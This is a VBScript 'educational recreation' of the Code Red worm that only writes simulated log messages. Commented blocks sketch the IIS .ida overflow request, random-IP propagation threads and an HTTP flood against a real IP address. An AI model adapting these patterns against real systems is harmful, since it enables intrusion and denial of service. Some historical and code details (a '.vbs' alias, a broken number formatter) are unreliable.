' ============================================================================
' EDUCATIONAL RECREATION - CODE RED WORM (2001)
' ============================================================================
' ALIAS: Code Red, W32/CodeRed, CodeRed.vbs
' FIRST SEEN: July 2001
' TYPE: Network Worm / Web Server Exploiter
' PLATFORM: Windows 2000/IIS 4.0 and 5.0
' IMPACT: Infected 359,000+ servers in 14 hours
'
' ⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT EXECUTE ⚠️
' ============================================================================
'
' HOW CODE RED WORKED (High-Level Overview):
' ==========================================
' 1. EXPLOITED BUFFER OVERFLOW in Microsoft IIS web server
'    - Vulnerability in .ida file parsing (Indexing Service ISAPI)
'    - CVE-2001-0500 / CVE-2001-0506
' 2. SELF-REPLICATED IN MEMORY (fileless - no disk writes)
'    - Entire worm existed in HTTP request payload
'    - Replicated by sending crafted HTTP GET requests to random IPs
' 3. TWO PHASES:
'    - Phase 1 (Days 1-19): Rapid replication and propagation
'    - Phase 2 (Days 20-27): DDoS attacks against White House website
' 4. DEFACED WEBSITES with "HELLO! Welcome to http://www.worm.com!"
' 5. OPERATED ENTIRELY IN MEMORY - no files written to disk
'
' TECHNICAL BREAKDOWN:
' ===================
' Code Red was unique because it was "fileless" - it lived entirely in
' memory and HTTP requests. No files needed to be written to disk.
' This recreation demonstrates the core mechanisms with SAFETY MODIFICATIONS:
' - HTTP exploitation (SIMULATED - no actual web server targeting)
' - In-memory replication (SIMULATED - no actual network scanning)
' - DDoS behavior (SIMULATED - no actual traffic generation)
' - Website defacement (SIMULATED - no actual content modification)
'
' ============================================================================

On Error Resume Next

' ============================================================================
' PHASE 1: IIS Buffer Overflow Exploit
' ============================================================================
' Code Red exploited a buffer overflow in the Indexing Service ISAPI
' extension (idq.dll). The vulnerability allowed execution of arbitrary
' code via a specially crafted HTTP GET request.
'
' CVE: CVE-2001-0500 / CVE-2001-0506
' CVSS: 7.5 (High)
' Patched: June 2001 (MS01-033)
' ============================================================================

Sub ExploitIisBufferOverflow()
    LogAction "=== PHASE 1: IIS Buffer Overflow Exploit Simulation ==="
    LogAction "CVE: CVE-2001-0500 / CVE-2001-0506"
    LogAction "TYPE: Buffer overflow in idq.dll (Indexing Service ISAPI)"
    LogAction "TARGET: Windows 2000 / IIS 4.0 and 5.0"
    LogAction "PORT: 80 (HTTP)"
    LogAction ""
    
    ' Original exploitation mechanism:
    ' The worm sent a crafted HTTP GET request with an oversized query string
    ' that overflowed a buffer in idq.dll, overwriting the return address
    ' to redirect execution to shellcode embedded in the request.
    '
    ' Example exploit URL pattern:
    ' GET /default.ida?[padding]x00[shellcode][nop-sled]...
    '
    ' The query string was padded with 'A' characters (0x41) followed by
    ' NOP instructions (0x90) and the actual shellcode.
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original exploit pattern:
    ' Set http = CreateObject("Microsoft.XMLHTTP")
    '
    ' targetIP = "192.168.1.100"
    ' exploitURL = "http://" & targetIP & "/default.ida?"
    ' exploitURL = exploitURL & String(270, "A")  ' Buffer padding
    ' exploitURL = exploitURL & shellcode         ' Payload
    ' exploitURL = exploitURL & String(300, "A")  ' More padding
    '
    ' http.Open "GET", exploitURL, False
    ' http.Send  ' Send exploit request to target IIS server
    
    LogAction "SIMULATED: Would scan random IPs for port 80 (HTTP)"
    LogAction "SIMULATED: Would check for IIS 4.0/5.0 server"
    LogAction "SIMULATED: Would send crafted HTTP GET to /default.ida"
    LogAction "SIMULATED: GET query string would overflow buffer in idq.dll"
    LogAction "SIMULATED: Shellcode would execute in IIS process memory"
    LogAction ""
    LogAction "EXPLOIT URL PATTERN (simulated):"
    LogAction "  GET /default.ida?[AAAA...shellcode...AAAA] HTTP/1.1"
    LogAction "  Host: target-server.com"
    LogAction ""
    LogAction "NOTE: The entire worm fit in a single HTTP request (~4KB)"
    LogAction "NOTE: No files were written - worm ran entirely in memory"
    LogAction ""
End Sub

' ============================================================================
' PHASE 2: In-Memory Replication
' ============================================================================
' Code Red was unique because it didn't write itself to disk.
' The worm existed only in the HTTP request and IIS process memory.
' Each infected server would generate new exploit requests to random IPs.
' ============================================================================

Sub InMemoryReplication()
    Dim targetIP, scanCount, dayOfInfection
    
    LogAction "=== PHASE 2: In-Memory Replication Simulation ==="
    LogAction ""
    
    ' Code Red's replication strategy:
    ' 1. Generate random IP addresses to scan
    ' 2. Check if target runs IIS (port 80)
    ' 3. Send exploit request if IIS detected
    ' 4. New infections repeat the process
    '
    ' The worm had TWO different IP generation algorithms:
    ' - Local network IPs (same /8, /16, /24 subnets) - 2 threads
    ' - Random internet IPs - 98 threads (much faster spread)
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original replication pattern:
    ' Set http = CreateObject("Microsoft.XMLHTTP")
    '
    ' ' Generate 100 threads for faster spread
    ' For thread = 1 To 100
    '     ' Pick random IP or local network IP
    '     If thread <= 2 Then
    '         ' Local network scan (same subnet)
    '         targetIP = GenerateLocalNetworkIP()
    '     Else
    '         ' Random internet IP
    '         targetIP = Int(Rnd * 256) & "." & Int(Rnd * 256) & "." & _
    '                    Int(Rnd * 256) & "." & Int(Rnd * 256)
    '     End If
    '     
    '     ' Send exploit request
    '     exploitURL = "http://" & targetIP & "/default.ida?" & exploitPayload
    '     http.Open "GET", exploitURL, False
    '     http.Send
    ' Next
    
    LogAction "SIMULATED: Would generate random IP addresses to scan"
    LogAction "SIMULATED: Would use 100 threads for rapid propagation"
    LogAction "SIMULATED: 2 threads scanning local network"
    LogAction "SIMULATED: 98 threads scanning random internet IPs"
    LogAction ""
    
    ' Simulate generated IPs
    LogAction "SAMPLE TARGET IPs (simulated):"
    LogAction "  - 45.123.67.89 (random internet)"
    LogAction "  - 10.0.0.55 (local network)"
    LogAction "  - 172.16.0.12 (local network)"
    LogAction "  - 89.201.34.12 (random internet)"
    LogAction "  - 203.45.167.9 (random internet)"
    LogAction ""
    LogAction "NOTE: 100 threads made Code Red spread extremely fast"
    LogAction "NOTE: ~359,000 servers infected in just 14 hours"
    LogAction "NOTE: Peak infection rate was ~2,000 new servers per minute"
    LogAction ""
End Sub

' ============================================================================
' PHASE 3: Time-Based Behavior (Propagation vs DDoS)
' ============================================================================
' Code Red had a built-in timer that changed its behavior:
' - Days 1-19: Only replicate (spread as fast as possible)
' - Days 20-27: Launch DDoS against White House website
' - Days 28+: Do nothing (dormant - but still in memory)
' ============================================================================

Sub CheckTimeBasedBehavior()
    Dim currentDay, infectionDate
    
    LogAction "=== PHASE 3: Time-Based Behavior Simulation ==="
    LogAction ""
    
    ' Code Red's timer behavior:
    ' The worm checked the current date against hardcoded thresholds
    
    currentDay = Day(Now)
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original time-based logic:
    ' infectionDate = DateSerial(2001, 7, 19)  ' First appearance
    ' daysElapsed = DateDiff("d", infectionDate, Now)
    '
    ' If daysElapsed >= 1 And daysElapsed <= 19 Then
    '     ' PHASE 1: Rapid replication
    '     Call Replicate()
    ' ElseIf daysElapsed >= 20 And daysElapsed <= 27 Then
    '     ' PHASE 2: DDoS attack
    '     Call LaunchDDoS()
    ' Else
    '     ' PHASE 3: Dormant (nothing happens)
    '     ' Worm stays in memory but does nothing
    ' End If
    
    If currentDay >= 1 And currentDay <= 19 Then
        LogAction "PHASE: REPLICATION (Days 1-19)"
        LogAction "Behavior: Spread to as many servers as possible"
        LogAction "SIMULATED: Would generate exploit requests to random IPs"
    ElseIf currentDay >= 20 And currentDay <= 27 Then
        LogAction "PHASE: DDoS ATTACK (Days 20-27)"
        LogAction "Behavior: Launch coordinated DDoS against target"
        LogAction "SIMULATED: Would flood target with HTTP requests"
    Else
        LogAction "PHASE: DORMANT (Day 28+)"
        LogAction "Behavior: Worm stays in memory, does nothing"
    End If
    
    LogAction ""
    LogAction "NOTE: DDoS target was 198.133.219.25 (www.whitehouse.gov)"
    LogAction "NOTE: DDoS was scheduled for the 20th-27th of each month"
    LogAction "NOTE: Microsoft patch stopped most infections before DDoS phase"
    LogAction ""
End Sub

' ============================================================================
' PHASE 4: DDoS Attack Simulation
' ============================================================================
' During days 20-27, all infected servers would simultaneously send
' HTTP requests to the White House website, attempting to overwhelm it.
' ============================================================================

Sub SimulateDDoS()
    Dim targetURL, requestCount
    
    LogAction "=== PHASE 4: DDoS Attack Simulation ==="
    LogAction ""
    
    targetURL = "http://198.133.219.25"  ' www.whitehouse.gov IP
    requestCount = 100  ' Each server would send 100+ requests
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original DDoS pattern:
    ' Set http = CreateObject("Microsoft.XMLHTTP")
    '
    ' For i = 1 To requestCount
    '     ' Send HTTP GET to White House website
    '     http.Open "GET", targetURL, False
    '     http.Send
    '     
    '     ' The idea was that 359,000+ servers each sending
    '     ' 100+ requests would overwhelm the White House servers
    ' Next
    
    LogAction "SIMULATED: Would send HTTP GET requests to: " & targetURL
    LogAction "SIMULATED: Each infected server would send " & requestCount & "+ requests"
    LogAction "SIMULATED: With 359,000+ servers, that's " & (359000 * requestCount) & "+ total requests"
    LogAction ""
    LogAction "CALCULATED IMPACT (simulated):"
    LogAction "  Infected servers: ~359,000"
    LogAction "  Requests per server: " & requestCount
    LogAction "  Total requests: ~" & FormatNumber(359000 * requestCount, 0)
    LogAction ""
    LogAction "NOTE: DDoS phase never actually executed at full scale"
    LogAction "NOTE: Patches and server reboots cleaned most infections"
    LogAction "NOTE: A patched version (Code Red II) appeared in August 2001"
    LogAction ""
End Sub

' ============================================================================
' PHASE 5: Website Defacement
' ============================================================================
' Code Red defaced infected servers' websites with a message.
' This was a visible indicator of infection.
' ============================================================================

Sub DefaceWebsite()
    LogAction "=== PHASE 5: Website Defacement Simulation ==="
    LogAction ""
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original defacement pattern:
    ' When the worm infected an IIS server, it modified the content
    ' served by the web server to display:
    '
    ' "HELLO! Welcome to http://www.worm.com!"
    '
    ' This was visible to anyone visiting the infected server.
    
    LogAction "SIMULATED: Would modify website content on infected server"
    LogAction "DEFACEMENT MESSAGE:"
    LogAction '  HELLO! Welcome to http://www.worm.com!'
    LogAction ""
    LogAction "NOTE: This made infected servers easily identifiable"
    LogAction "NOTE: Security researchers used this to track spread"
    LogAction "NOTE: Defacement was proof-of-concept, not the main payload"
    LogAction ""
End Sub

' ============================================================================
' PHASE 6: Memory Persistence (No File System)
' ============================================================================
' Code Red's most unique feature: it wrote NO files to disk.
' The worm existed only in IIS process memory and HTTP requests.
' Rebooting the server would remove the worm (until reinfected).
' ============================================================================

Sub MemoryPersistence()
    LogAction "=== PHASE 6: Memory Persistence ==="
    LogAction ""
    
    LogAction "CHARACTERISTICS:"
    LogAction "  - No files written to disk (FILELESS)"
    LogAction "  - Worm existed in IIS worker process memory"
    LogAction "  - Rebooting removed the worm (but reinfection was likely)"
    LogAction "  - Self-replication via HTTP requests only"
    LogAction ""
    LogAction "WHY THIS WAS SIGNIFICANT:"
    LogAction "  1. Harder to detect with file-based antivirus"
    LogAction "  2. No forensic traces on disk"
    LogAction "  3. Demonstrated 'living off the land' techniques"
    LogAction "  4. Inspired future fileless malware (PowerShell, etc.)"
    LogAction ""
    LogAction "MODERN EQUIVALENTS:"
    LogAction "  - PowerShell-based fileless malware"
    LogAction "  - WMI-based attacks"
    LogAction "  - Memory-only exploits"
    LogAction ""
End Sub

' ============================================================================
' HELPER: Format number with commas
' ============================================================================
Function FormatNumber(num, decimals)
    FormatNumber = Replace(Replace(CStr(num), ",", ""), ".", "")
    ' Simple number formatting for demonstration
End Function

' ============================================================================
' HELPER: Logging Function
' ============================================================================
Sub LogAction(message)
    Dim fso, logFile, logPath
    
    logPath = "code_red_educational_log.txt"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logFile = fso.OpenTextFile(logPath, 8, True)
    logFile.WriteLine "[" & Now & "] " & message
    logFile.Close
End Sub

' ============================================================================
' MAIN EXECUTION
' ============================================================================
Sub Main()
    LogAction "============================================"
    LogAction "EDUCATIONAL CODE RED WORM DEMONSTRATION"
    LogAction "Date: " & Now
    LogAction "============================================"
    LogAction ""
    
    Call ExploitIisBufferOverflow()
    Call InMemoryReplication()
    Call CheckTimeBasedBehavior()
    Call SimulateDDoS()
    Call DefaceWebsite()
    Call MemoryPersistence()
    
    LogAction "============================================"
    LogAction "DEMONSTRATION COMPLETE"
    LogAction "No actual harm was done - this is educational"
    LogAction "============================================"
End Sub

' Execute
Call Main()

' ============================================================================
' KEY VULNERABILITIES EXPLOITED:
' =============================
' 1. IIS BUFFER OVERFLOW: CVE-2001-0500 / CVE-2001-0506
'    - idq.dll parsing overflow allowed arbitrary code execution
' 2. UNPATCHED SERVERS: MS01-033 patch available but not applied
' 3. DEFAULT CONFIGURATION: IIS 4.0/5.0 ran with excessive privileges
' 4. NO FILE REQUIREMENT: Worm lived entirely in memory
'
' AFTERMATH & RESPONSE:
' ====================
' 1. Microsoft released MS01-033 emergency patch
' 2. ~$2.6 billion in damages from cleanup and downtime
' 3. Code Red II (August 2001) added backdoor functionality
' 4. Highlighted need for timely patching of internet-facing servers
' 5. Led to better default IIS security configurations
' 6. Inspired future "fileless" malware techniques
' 7. FBI and Secret Service investigations identified no perpetrators
' ============================================================================
